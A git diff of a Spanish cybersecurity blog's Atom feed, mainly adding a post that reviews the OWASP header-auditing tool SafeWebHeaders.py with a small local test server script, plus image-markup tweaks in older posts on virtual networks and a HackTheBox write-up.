@@ -1,4 +1,236 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-29T22:54:55-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">Redes virtuales</title><link href="http://localhost:4000/virtualred/" rel="alternate" type="text/html" title="Redes virtuales" /><published>2023-03-29T00:00:00-05:00</published><updated>2023-03-29T00:00:00-05:00</updated><id>http://localhost:4000/virtualred</id><content type="html" xml:base="http://localhost:4000/virtualred/">&lt;p align=&quot;center&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-29T23:11:14-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">SafeWebHeaders.py</title><link href="http://localhost:4000/safewebheaders/" rel="alternate" type="text/html" title="SafeWebHeaders.py" /><published>2023-04-12T00:00:00-05:00</published><updated>2023-04-12T00:00:00-05:00</updated><id>http://localhost:4000/safewebheaders</id><content type="html" xml:base="http://localhost:4000/safewebheaders/">&lt;p style=&quot;text-align: center;&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/02-tarjeta.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;¡Hola! En esta ocasión vamos a conocer la utilidad &lt;a href=&quot;https://raw.githubusercontent.com/Thegame008/Secure-Headers-OWASP/main/SafeWebHeaders.py&quot;&gt;SafeWebHeaders.py&lt;/a&gt; creada por &lt;a href=&quot;https://github.com/Thegame008/&quot;&gt;The Game 008&lt;/a&gt;, para auditar las cabeceras de una pagina web basada en las recomendaciones de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OWASP&lt;/code&gt; (Open Web Application Security Project).&lt;/p&gt;
+
+&lt;h2 id=&quot;cabeceras-web&quot;&gt;CABECERAS WEB&lt;/h2&gt;
+
+&lt;p&gt;Las cabeceras web, son parte de los datos que se envían desde un servidor web al cliente en una respuesta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;. Estas cabeceras &lt;strong&gt;pueden&lt;/strong&gt; contienen información adicional sobre la respuesta, incluyendo información sobre el servidor, la caché, el tipo de contenido, la codificación de caracteres, entre otros. Estas son indispensables porque permiten que los navegadores web y otros clientes logren procesar la respuesta del servidor y representar la información al usuario final.&lt;/p&gt;
+
+&lt;p&gt;Algunos de los riesgos que se pueden presentar a nivel de seguridad en cabeceras son las siguientes:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Divulgación de información&lt;/li&gt;
+  &lt;li&gt;Inyecciones de código&lt;/li&gt;
+  &lt;li&gt;Secuestros de sesiones o clicks (hijacking)&lt;/li&gt;
+  &lt;li&gt;Exposición de información confidencial&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/03-header.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;owasp&quot;&gt;OWASP&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Open Web Application Security Project&lt;/strong&gt; es una organización sin ánimo de lucro con el objetivo de mejorar la seguridad del software y las aplicaciones web. Gracias a esto se han podido identificar los riesgos de seguridad más críticos y comunes a nivel &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt; y han proporcionado recursos y recomendaciones para ayudar a las comunidades a proteger sus aplicativos y páginas web.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/04-header.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;OWASP tiene una lista de los &lt;a href=&quot;https://owasp.org/www-project-top-ten/&quot;&gt;diez riesgos de seguridad más críticos en aplicaciones web&lt;/a&gt;, conocida como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OWASP Top Ten&lt;/code&gt;. Entre este top se encuentra la falta de protección adecuada en las cabeceras web.&lt;/p&gt;
+
+&lt;p&gt;A continuación, las &lt;strong&gt;recomendaciones&lt;/strong&gt; proporcionadas por OWASP para mejorar la seguridad de las aplicaciones web:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Strict-Transport-Security (HSTS)&lt;/code&gt; que obliga al navegador a utilizar solo HTTPS para las solicitudes futuras a la misma dirección web&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; que evita la incrustación no deseada de páginas web en un marco (frame) y ayuda a prevenir el clickjacking&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-XSS-Protection&lt;/code&gt; que activa una protección integrada contra ataques XSS (Cross-Site Scripting) en los navegadores modernos&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Content-Type-Options&lt;/code&gt; que evita la interpretación automática del contenido cargado para prevenir ataques MIME sniffing&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Security-Policy&lt;/code&gt; que limita los recursos que un sitio web puede cargar en su página, lo que ayuda a prevenir los ataques de inyección de código&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;instalar-safewebheaderspy&quot;&gt;INSTALAR SafeWebHeaders.py&lt;/h2&gt;
+
+&lt;p&gt;En el &lt;a href=&quot;https://github.com/Thegame008/Secure-Headers-OWASP&quot;&gt;repositorio&lt;/a&gt; puedes encontrar el paso a paso de como instalar la herramienta, sin embargo, acá tambien te mostramos el proceso.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/Thegame008/Secure-Headers-OWASP.git
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Secure-Headers-OWASP
+python3 SafeWebHeaders.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;testingheaderspy&quot;&gt;testingHeaders.py&lt;/h2&gt;
+
+&lt;p&gt;Hemos tomado el tiempo de hacer una prueba de concepto que puede ayudarles a validar cabeceras en un entorno local, por eso vamos a compartir el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testingHeaders.py&lt;/code&gt; desarrollado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt;, para que puedan hacerlo en sus entornos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
+
+import sys
+import signal
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from colorama import Fore, Style
+from tqdm import tqdm
+
+
+class MyHandler&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BaseHTTPRequestHandler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+    
+    def do_GET&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+
+        &lt;span class=&quot;c&quot;&gt;#### !! COMENTAR ESTAS 2 LINEAS PARA VER DIVULGACIÓN DE SOFTWARE !! ###&lt;/span&gt;
+        self.server_version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
+        self.sys_version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
+
+        &lt;span class=&quot;c&quot;&gt;# Obtiene las cabeceras personalizadas&lt;/span&gt;
+
+        &lt;span class=&quot;c&quot;&gt;#### !! MODIFICAR CABECERAS DE SEGURIDAD SI ES NECESARIO !! ####&lt;/span&gt;
+        headers &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;s1&quot;&gt;'Strict-Transport-Security'&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'max-age=63072000; includeSubDomains; preload'&lt;/span&gt;,
+            &lt;span class=&quot;s1&quot;&gt;'X-Frame-Options'&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'SAMEORIGIN'&lt;/span&gt;,
+            &lt;span class=&quot;s1&quot;&gt;'X-XSS-Protection'&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'1; mode=block'&lt;/span&gt;,
+            &lt;span class=&quot;s1&quot;&gt;'X-Content-Type-Options'&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'nosniff'&lt;/span&gt;,
+            &lt;span class=&quot;s1&quot;&gt;'Content-Security-Policy'&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;default-src 'self'; base-uri 'self'; img-src 'self' data:; object-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'&quot;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;c&quot;&gt;# Imprime las cabeceras actuales&lt;/span&gt;
+        print&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        print&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Fore.YELLOW + &lt;span class=&quot;s1&quot;&gt;'[i] Cabeceras actuales:'&lt;/span&gt; + Style.RESET_ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        print&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;header, value &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;headers.items&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
+            print&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;f&lt;span class=&quot;s1&quot;&gt;'{Fore.CYAN}{header}:{Style.RESET_ALL} {value}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        print&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+        &lt;span class=&quot;c&quot;&gt;# Envía las cabeceras personalizadas&lt;/span&gt;
+        self.send_response&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        self.send_header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Content-type'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'text/html'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;header, value &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;headers.items&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
+            self.send_header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;header, value&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        self.end_headers&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+
+        html &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&quot;
+        &amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+	&amp;lt;meta charset=&quot;&lt;/span&gt;UTF-8&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
+	&amp;lt;title&amp;gt;Testing Headers PoC&amp;lt;/title&amp;gt;
+	&amp;lt;style&amp;gt;
+		body {
+			background-color: #222;
+            color: #eee;
+			margin: 0;
+			padding: 0;
+		}
+		h1 {
+			text-align: center;
+			font-family: Arial, sans-serif;
+			color: #fff;
+			background-color: #333;
+			margin: 0;
+			padding: 20px;
+		}
+		.container {
+            background-color: #333;
+            color: #eee;
+			width: 80%;
+			margin: auto;
+			border: 1px solid #ccc;
+			padding: 20px;
+			box-shadow: 0 2px 4px 0 rgba(0,0,0,0.2);
+			margin-top: 50px;
+		}
+		p {
+			font-family: Arial, sans-serif;
+			font-size: 16px;
+			line-height: 1.5;
+			color: #eee;
+			margin: 0;
+			padding: 0;
+		}
+		footer {
+			background-color: #333;
+            color: #eee;
+			padding: 10px;
+			text-align: center;
+			font-size: 12px;
+			font-family: Arial, sans-serif;
+			margin-top: 50px;
+		}
+		footer a {
+			color: #fff;
+		}
+	&amp;lt;/style&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+	&amp;lt;h1&amp;gt;Testing Headers PoC&amp;lt;/h1&amp;gt;
+	&amp;lt;div class=&quot;&lt;/span&gt;container&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
+		&amp;lt;p&amp;gt;¡Bienvenido al servidor HTTP de prueba!&amp;lt;/p&amp;gt;
+		&amp;lt;p&amp;gt;Esta página es una demostración de cómo se pueden enviar cabeceras personalizadas desde un servidor HTTP Python.&amp;lt;/p&amp;gt;
+		&amp;lt;p&amp;gt;Puedes personalizar el contenido de esta página como desees.&amp;lt;/p&amp;gt;
+	&amp;lt;/div&amp;gt;
+	&amp;lt;footer&amp;gt;
+		Powered by bast1ant1c &amp;amp;copy; 2023
+	&amp;lt;/footer&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+        &quot;&quot;&quot;&lt;/span&gt;
+        self.wfile.write&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;html, &lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+
+
+
+def run&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ip, port&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+    &lt;span class=&quot;c&quot;&gt;# Especifica el puerto y la dirección del servidor&lt;/span&gt;
+    address &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ip, int&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+    httpd &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; HTTPServer&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;address, MyHandler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    print&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Fore.GREEN + f&lt;span class=&quot;s1&quot;&gt;'[&amp;gt;] Iniciando servidor en el puerto {port}...'&lt;/span&gt; + Style.RESET_ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;# Captura la señal SIGINT para salir graciosamente con Ctrl+C&lt;/span&gt;
+    def signal_handler&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sig, frame&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+         print&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Fore.RED + &lt;span class=&quot;s1&quot;&gt;'\n[!] Saliendo ...'&lt;/span&gt; + Style.RESET_ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+         sys.exit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+    signal.signal&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signal.SIGINT, signal_handler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    httpd.serve_forever&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;__name__ &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'__main__'&lt;/span&gt;:
+    &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;len&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys.argv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;lt; 3:
+        print&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Fore.RED + &lt;span class=&quot;s1&quot;&gt;'\n[x] Se requiere la dirección IP y el puerto como argumentos\n'&lt;/span&gt; + Style.RESET_ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        sys.exit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    ip &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; sys.argv[1]
+    port &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; sys.argv[2]
+    run&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ip, port&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De esta manera solo tendras que ejecutar el script con tu &lt;strong&gt;dirección IP&lt;/strong&gt; y el &lt;strong&gt;puerto&lt;/strong&gt; de preferencia para activar un servidor web con cabeceras de seguridad implementadas, para que puedas auditarlo con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SafeWebHeaders.py&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 testingHeaders.py &amp;lt;IP&amp;gt; &amp;lt;PUERTO&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/05-header.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;safewebheaderspy--testingheaderspy-sin-cabeceras&quot;&gt;SafeWebHeaders.py + testingHeaders.py (SIN CABECERAS)&lt;/h2&gt;
+
+&lt;p&gt;Se ha modificado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testingHeaders.py&lt;/code&gt; para que no tenga cabeceras de seguridad implementadas, luego auditamos nuestra web de prueba con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SafeWebHeaders.py&lt;/code&gt; mostrando las cabeceras que deberían estar implementadas, pero no se evidencian en el servidor.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/06-header.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;safewebheaderspy--testingheaderspy-cabeceras-parcialmente-implementadas&quot;&gt;SafeWebHeaders.py + testingHeaders.py (CABECERAS PARCIALMENTE IMPLEMENTADAS)&lt;/h2&gt;
+
+&lt;p&gt;Se ha modificado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testingHeaders.py&lt;/code&gt; para que tenga algunas cabeceras de seguridad implementadas y otras con configuración diferente, luego auditamos nuestra web de prueba con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SafeWebHeaders.py&lt;/code&gt; mostrando las cabeceras correctas, las de configuración incorrecta y las cabeceras faltantes en el servidor.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/07-header.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;safewebheaderspy--testingheaderspy-cabeceras-totalmente-implementadas&quot;&gt;SafeWebHeaders.py + testingHeaders.py (CABECERAS TOTALMENTE IMPLEMENTADAS)&lt;/h2&gt;
+
+&lt;p&gt;Se ha modificado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testingHeaders.py&lt;/code&gt; para que tenga todas las cabeceras de seguridad implementadas, luego auditamos nuestra web de prueba con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SafeWebHeaders.py&lt;/code&gt; mostrando las cabeceras correctas en el servidor.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/08-header.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Este es el review de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SafeWebHeaders.py&lt;/code&gt; del colega &lt;a href=&quot;https://github.com/thegame008&quot;&gt;The Game 008&lt;/a&gt;, los invito a que lo sigan, a que miren sus repositorios y apoyen sus herramientas con una &lt;strong&gt;estrella&lt;/strong&gt; y también es una invitación para animarlos a hacer nuevas herramientas, algo que puede ser útil para ustedes, puede ser útil para alguién más y podemos generar muy buenos repositorios en comunidad, compartir conocimiento hace que seamos mejores en nuestro campo!&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/09-finish.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Python" /><category term="Script" /><summary type="html">Vamos a conocer la utilidad SafeWebHeaders.py de The Game 008 para auditar cabeceras web. ¡Let's hack!</summary></entry><entry><title type="html">Redes virtuales</title><link href="http://localhost:4000/virtualred/" rel="alternate" type="text/html" title="Redes virtuales" /><published>2023-03-29T00:00:00-05:00</published><updated>2023-03-29T00:00:00-05:00</updated><id>http://localhost:4000/virtualred</id><content type="html" xml:base="http://localhost:4000/virtualred/">&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/virtualred/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -20,7 +252,7 @@
 
 &lt;p&gt;Con la nueva configuración, vamos a tener el siguiente ambiente compuesto por 2 redes internas, una por conexión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puente&lt;/code&gt; (bridge) y otra por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host Only Network Adapter&lt;/code&gt; para crear redes privadas virtuales y limitar el acceso de la máquina virtual solo al host en el que se ejecuta.&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/virtualred/03-virtual.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -36,7 +268,7 @@
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/virtualred/04-virtual.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -53,7 +285,7 @@
 
 &lt;p&gt;&lt;strong&gt;Nota:&lt;/strong&gt; &lt;em&gt;Es importante aclarar que necesitas permisos de administrador para crear la interfaz, por lo que te va a pedir una confirmación al momento de crearla.&lt;/em&gt;&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/virtualred/05-virtual.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -71,7 +303,7 @@
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/virtualred/06-virtual.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -90,7 +322,7 @@
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/virtualred/07-virtual.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -112,7 +344,7 @@
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/virtualred/08-virtual.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -136,7 +368,7 @@
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/virtualred/09-virtual.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -156,7 +388,7 @@
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/virtualred/10-virtual.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -178,7 +410,7 @@
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/virtualred/11-virtual.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -186,7 +418,7 @@
 
 &lt;p&gt;Ya tenemos el entorno configurado, ahora vamos a validar si nuestras máquinas tienen la configuración de red correcta.&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/virtualred/12-virtual.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -205,7 +437,7 @@
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/virtualred/13-virtual.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -213,7 +445,7 @@
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Configuraciones" /><category term="Virtualbox" /><summary type="html">Vamos a crear una red virtual para entornos de pivoting. ¡Let's hack!</summary></entry><entry><title type="html">HTB support AD</title><link href="http://localhost:4000/support/" rel="alternate" type="text/html" title="HTB support AD" /><published>2023-03-15T00:00:00-05:00</published><updated>2023-03-15T00:00:00-05:00</updated><id>http://localhost:4000/support</id><content type="html" xml:base="http://localhost:4000/support/">&lt;p align=&quot;center&quot;&gt;
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Configuraciones" /><category term="Virtualbox" /><summary type="html">Vamos a crear una red virtual para entornos de pivoting. ¡Let's hack!</summary></entry><entry><title type="html">HTB support AD</title><link href="http://localhost:4000/support/" rel="alternate" type="text/html" title="HTB support AD" /><published>2023-03-15T00:00:00-05:00</published><updated>2023-03-15T00:00:00-05:00</updated><id>http://localhost:4000/support</id><content type="html" xml:base="http://localhost:4000/support/">&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/support/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -517,7 +749,7 @@ administrator@support.htb
   &lt;/ul&gt;
 
 &lt;/blockquote&gt;
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/support/03-win.png&quot; /&gt;
 &lt;/p&gt;
 &lt;blockquote&gt;
@@ -544,7 +776,7 @@ Aceptar
   &lt;/ul&gt;
 
 &lt;/blockquote&gt;
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/support/04-win.png&quot; /&gt;
 &lt;/p&gt;
 &lt;blockquote&gt;
@@ -558,7 +790,7 @@ Aceptar
   &lt;/ul&gt;
 
 &lt;/blockquote&gt;
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/support/05-win.png&quot; /&gt;
 &lt;/p&gt;
 &lt;blockquote&gt;
@@ -765,7 +997,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/support/06-blood.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -864,13 +1096,13 @@ echo.%root:~0,10%
 
 &lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support&lt;/code&gt; de HackTheBox!&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
